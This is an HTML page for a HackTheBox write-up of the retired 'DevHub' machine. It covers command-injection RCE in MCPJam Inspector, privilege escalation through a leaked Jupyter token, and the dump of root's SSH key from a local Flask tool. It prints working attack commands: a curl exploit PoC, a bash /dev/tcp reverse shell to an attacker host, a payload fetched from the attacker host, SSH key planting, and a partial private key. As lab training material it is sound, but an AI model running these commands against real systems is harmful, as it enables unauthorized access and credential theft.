@@ -1,1 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>DevHub | Youssef Ashraf</title>
+<style>
+:root{--bg:#f6f7f9;--panel:#fff;--ink:#161a22;--mute:#5b6473;--line:#dde1e8;--acc:#0b7a5a;--acc-ink:#fff;--code:#eef0f4;
+box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){--bg:#0e1116;--panel:#151a22;--ink:#e6e9ef;--mute:#98a2b3;--line:#262d38;--acc:#3ddc97;--acc-ink:#07130e;--code:#0c1017}}
+:root[data-theme="dark"]{--bg:#0e1116;--panel:#151a22;--ink:#e6e9ef;--mute:#98a2b3;--line:#262d38;--acc:#3ddc97;--acc-ink:#07130e;--code:#0c1017}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--ink);font:16px/1.7 system-ui,-apple-system,"Segoe UI",Roboto,sans-serif}
+.wrap{max-width:760px;margin:0 auto;padding:40px 20px 80px}
+a{color:var(--acc)}
+.back{display:inline-block;margin-bottom:28px;color:var(--mute);text-decoration:none;font-size:.92rem}
+.back:hover{color:var(--acc)}
+header h1{font-size:2.1rem;margin:0 0 8px;letter-spacing:-.02em}
+.meta{color:var(--mute);font-size:.92rem;margin:0 0 32px;display:flex;gap:10px;flex-wrap:wrap}
+.meta .pill{border:1px solid var(--line);border-radius:99px;padding:2px 12px}
+article p{margin:0 0 18px}
+article img{max-width:100%;border-radius:8px;border:1px solid var(--line);display:block;margin:4px 0 20px}
+article pre{background:var(--code);border:1px solid var(--line);border-radius:8px;padding:14px 16px;overflow-x:auto;margin:0 0 20px;font-size:.88rem;line-height:1.55}
+article code{font:.88em ui-monospace,Menlo,Consolas,monospace}
+article :not(pre)>code{background:var(--code);border:1px solid var(--line);border-radius:4px;padding:1px 6px}
+article h3{margin:32px 0 12px;font-size:1.2rem}
+article ul,article ol{margin:0 0 18px;padding-left:22px}
+article li{margin-bottom:6px}
+footer{margin-top:48px;padding-top:20px;border-top:1px solid var(--line);color:var(--mute);font-size:.88rem}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <a class="back" href="../index.html">&larr; Back to portfolio</a>
+  <header>
+    <h1>DevHub</h1>
+    <p class="meta"><span class="pill">HackTheBox &bull; Retired</span><span>Oct 2026</span></p>
+  </header>
+  <article>
+    <p><a href="https://app.hackthebox.com/machines/DevHub?sort_by=created_at&amp;sort_type=desc">DevHub</a> is a box created by HackTheBox, which contains a MCPJam Inspector Web app running that has an exposed api endpoint  which does not sanitize and blindly executes the command arguments supplied to it through the POST JSON request, which gives us an initial foothold as the user <code>mcp-dev</code> , from there we notice that a Jupyter-env lab running locally on port 8888 and a Server Token was found in the enumeration of the processes which was then used to get a terminal access as <code>analyst</code> , and then another web server running on port 5000 which runs as root was used to extract the private <code>root ssh</code> keys which was used to achieve Root</p>
+<p>As always we start with an nmap scan </p>
+<pre><code class="language-shell">nmap -sVC -vv -oA nmapScan 10.97.58.83 -p- -T3
+</code></pre>
+<pre><code class="language-text">PORT     STATE SERVICE REASON         VERSION                                                                                                                               
+22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)                                                                         
+| ssh-hostkey:                                                                                                                                                              
+|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)                                                                                                             
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPWeIVAL8xAfqZkJzRocGOpKCgXQk807PgJQqBcvDCiTcyFYlXvFY0v+sI1XXnYKghVRDkCxYy23sjlFMceuifE=          
+|   256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)                                                                                                           
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAWDVyu6UXTR8XbXiFXOJx0xwUVCRheT9hT20o1VbEht                                                                                          
+80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)                                                                                                                 
+|_http-title: Did not follow redirect to http://devhub.htb/                                                                                                                 
+| http-methods:                                                                                                                                                             
+|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                                
+|_http-server-header: nginx/1.18.0 (Ubuntu)                                                                                                                                 
+6274/tcp open  unknown syn-ack ttl 63                                                                                                                                       
+| fingerprint-strings:                                                                                                                                                      
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq:                                                                                               
+|     HTTP/1.1 400 Bad Request                                                                                                                                              
+|     Connection: close                                                                                                                                                     
+|   GetRequest:                                                                                                                                                             
+|     HTTP/1.1 200 OK                                                                                                                                                       
+|     access-control-allow-credentials: true                                                                                                                                
+|     content-length: 466                                                                                                                                                   
+|     content-type: text/html; charset=utf-8                                                                                                                                
+|     vary: Origin                                                                                                                                                          
+|     Date: Wed, 07 Oct 2026 13:56:28 GMT                                                                                                                                   
+|     Connection: close                                                                                                                                                     
+|     &lt;!doctype html&gt;                                                                                                                                                       
+|     &lt;html lang=&quot;en&quot;&gt;                                                                                                                                                      
+|     &lt;head&gt;                                                                                                                                                                
+|     &lt;meta charset=&quot;UTF-8&quot; /&gt;                                                                                                                                              
+|     &lt;link rel=&quot;icon&quot; type=&quot;image/svg+xml&quot; href=&quot;/mcp_jam.svg&quot; /&gt;                                                                                                          
+|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;
+|     &lt;title&gt;MCPJam Inspector&lt;/title&gt;
+|     &lt;script type=&quot;module&quot; crossorigin src=&quot;/assets/index-DRYhT9Xb.js&quot;&gt;&lt;/script&gt;
+|     &lt;link rel=&quot;stylesheet&quot; crossorigin href=&quot;/assets/index-XvFRNbCs.css&quot;&gt;
 
+</code></pre>
+<p><img alt="" src="images/devhub/img01.png" />
+We see a web server running on both port 80, and port 6274, so first we add the <code>devhub.htb</code> to our <code>/etc/hosts</code> file, and then browse to <code>http://devhub.htb/</code> 
+<img alt="" src="images/devhub/img02.png" />
+we find <code>DevHub</code> and we do get a analytics dashboard localhost:8888. I tried to fuzz for sub directories and vhosts, but nothing was found</p>
+<p>so nothing suspicious was found on the DevHub http host, so we browse onto the host on port <code>6274</code> we find this
+<img alt="" src="images/devhub/img03.png" />
+googling around we find that MCPJam is essentially an open source application used to test Model Context Apps, and MCP Apps, and ChatGPT 
+Key Capabilities</p>
+<ul>
+<li>
+<p><strong>Server Testing &amp; Debugging:</strong> Manually invoke tools, read resources, fetch prompts, and trace full JSON-RPC message exchanges.</p>
+</li>
+<li>
+<p><strong>Multi-Client &amp; Multi-Model Evaluation:</strong> Test and evaluate MCP servers across 16+ AI clients (such as Claude, ChatGPT, Cursor, and VS Code) and 170+ Large Language Models.</p>
+</li>
+<li>
+<p><strong>OAuth Debugging:</strong> Test authentication flows and step-by-step OAuth/security conformance.</p>
+</li>
+<li>
+<p><strong>Playground &amp; Comparison:</strong> Run side-by-side prompt comparisons and widget emulation.</p>
+</li>
+</ul>
+<p>so when we browse to settings, we find the MCPJam version is
+<img alt="" src="images/devhub/img04.png" />
+1.4.2, so if we google to see if there are any vulnerabilities, and we do see that its vulnerable to <code>CVE-2026-23744</code> as per this <a href="https://github.com/advisories/GHSA-232v-j27c-5pp6">advisory</a></p>
+<p>The vulnerability is basically that MCPJam inspector binds to <code>0.0.0.0</code> making its HTTP APIs remotely reachable, and not enclosed into a internal network. This allows the <code>/api/mcp/connect</code> API, which is intended for connecting to MCP servers, becomes an open entry point for unauthorized requests. When an HTTP request reaches the <code>/connect</code> route, the system extracts the <code>command</code> and <code>args</code> fields without performing any security checks, leading to the execution of arbitrary command.</p>
+<p>The POC used in the advisory was</p>
+<pre><code class="language-shell">curl http://10.97.58.83:6274/api/mcp/connect --header &quot;Content-Type: application/json&quot; --data &quot;{\&quot;serverConfig\&quot;:{\&quot;command\&quot;:\&quot;cmd.exe\&quot;,\&quot;args\&quot;:[\&quot;/c\&quot;, \&quot;calc\&quot;],\&quot;env\&quot;:{}},\&quot;serverId\&quot;:\&quot;mytest\&quot;}&quot;`
+</code></pre>
+<p>so it since our nmap scan showed that this is a linux box, we need to rework the command a bit, and test if we do have RCE to the box</p>
+<p>or we could find a github repo with the <a href="https://raw.githubusercontent.com/alisster00/CVE-2026-23744-RCE/refs/heads/main/script.py">PoC</a> , so now we run it like so</p>
+<pre><code class="language-shell">python3 MCPJam_RCE.py -p 6274 -l &lt;attack-host-ip&gt; --lport 5555 &lt;devhub-ip&gt;
+</code></pre>
+<p>but before that we can start our <code>penelope</code> listener</p>
+<pre><code class="language-shell">penelope -p 5555
+</code></pre>
+<p><img alt="" src="images/devhub/img05.png" /></p>
+<p><img alt="" src="images/devhub/img06.png" />
+Now lets extract linpeas and try to see what could be found for enumeration, but before that I usually enumerate the kernel version and whether gcc or g++ compilers are found since these could be used for an easy win , 
+<img alt="" src="images/devhub/img07.png" />
+so now we could google that linux version and see whether there are any kernel exploits, but testing it further most of the exploits did not work, so then we transferred linpeas to the host</p>
+<pre><code class="language-shell"># attack host:
+python3 -m http.server 6666
+
+# mcp-dev host:
+cd /home/mcp-dev
+curl http://&lt;attack-host&gt;:6666/linpeas.sh -o linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh -a &gt; linpeasResults.txt
+</code></pre>
+<p>So going through the linpeas output, we found this in the processes running
+<img alt="" src="images/devhub/img08.png" />
+so it looks like its a jupyter note left , and it contains a ServerApp token, which highly suggests that there is a web server running on the port specified which is <code>8888</code> .
+<img alt="" src="images/devhub/img09.png" /></p>
+<p>So First lets forward the port using ssh, first we need to create a key </p>
+<h3>1. Generate a key pair on your attack box (if you don't have one for this box yet)</h3>
+<pre><code class="language-bash"># attack host:
+ssh-keygen -t ed25519 -f ~/.ssh/devhub -N &quot;&quot;
+</code></pre>
+<p>This gives you <code>~/.ssh/devhub</code> (private) and <code>~/.ssh/devhub.pub</code> (public).</p>
+<h3>2. Get the pubkey contents</h3>
+<pre><code class="language-bash"># attack host:
+cat ~/.ssh/devhub.pub
+</code></pre>
+<h3>3. From your shell as mcp-dev, write it to authorized_keys</h3>
+<pre><code class="language-bash"># victim host:
+mkdir -p ~/.ssh
+chmod 700 ~/.ssh
+echo &quot;&lt;public_key_content&gt;&quot; &gt;&gt; ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+</code></pre>
+<h3>4. SSH in with the key</h3>
+<pre><code class="language-bash"># attack host:
+chmod 600 ~/.ssh/devhub
+ssh -i ~/.ssh/devhub mcp-dev@&lt;target_ip&gt;
+</code></pre>
+<h3>5. Local port forward to hit internal services</h3>
+<pre><code class="language-bash">ssh -i ~/.ssh/devhub -L 8888:localhost:8888 mcp-dev@&lt;target-ip&gt;
+</code></pre>
+<p>Then browse <code>http://localhost:8080</code> on your attack box. </p>
+<p><img alt="" src="images/devhub/img10.png" />
+we could set up a new password instead or input the token and access the terminal from there
+<img alt="" src="images/devhub/img11.png" />
+now we can just use a basic bash reverse shell to get a shell as analyst</p>
+<pre><code class="language-bash">bash -i &gt;&amp; /dev/tcp/&lt;attack-ip&gt;/&lt;listening_port&gt; 0&gt;&amp;1
+</code></pre>
+<p><img alt="" src="images/devhub/img12.png" />
+<img alt="" src="images/devhub/img13.png" /></p>
+<p>Now with analyst , we did find a python server in /opt/opsmcp/server.py 
+<img alt="" src="images/devhub/img14.png" />
+whats interesting is that this is running as root, so potentially we could alter the server.py script, if we have access to it and elevate our privileges. We could check if we can write the script like so
+<img alt="" src="images/devhub/img15.png" />
+if we analyze the script we see its a flask server exposing its API key, and it uses tools
+<img alt="" src="images/devhub/img16.png" />
+<img alt="" src="images/devhub/img17.png" />
+so if we call this tool through a curl request and supply it with the <code>target="ssh_keys"</code> and <code>confirm=True</code> we should receive back the private SSH keys. We also found that the server is running on localhost:5000
+<img alt="" src="images/devhub/img18.png" /></p>
+<p>so we can craft a curl request</p>
+<pre><code class="language-shell">curl -s \
+  -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a' \
+  -H 'Content-Type: application/json' \
+  -X POST \
+  http://127.0.0.1:5000/tools/call \
+  -d '{&quot;name&quot;:&quot;ops._admin_dump&quot;,&quot;arguments&quot;:{&quot;target&quot;:&quot;ssh_keys&quot;,&quot;confirm&quot;:true}}'
+</code></pre>
+<p><img alt="" src="images/devhub/img19.png" />
+so now all we need to do is just use this ssh key and we log in as root</p>
+<pre><code class="language-txt">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+&lt;SNIP&gt;6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z
+6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit&lt;SNIP&gt;bUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s
+qKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa
+V3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS
+&lt;SNIP&gt;
+nI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr
+C8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK
+lFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=
+-----END OPENSSH PRIVATE KEY-----
+</code></pre>
+<p>then </p>
+<pre><code class="language-shell">chmod 600 root_ssh_key
+</code></pre>
+<p>then log in </p>
+<pre><code class="language-shell">ssh -i root_ssh_key root@&lt;DevHub_IP&gt;
+</code></pre>
+<p><img alt="" src="images/devhub/img20.png" /></p>
+<p>and thats it</p>
+<p>Happy Hacking!</p>
+  </article>
+  <footer>Written by Youssef Ashraf. Published for a retired HTB machine, in line with HTB's write-up policy.</footer>
+</div>
+</body>
+</html>
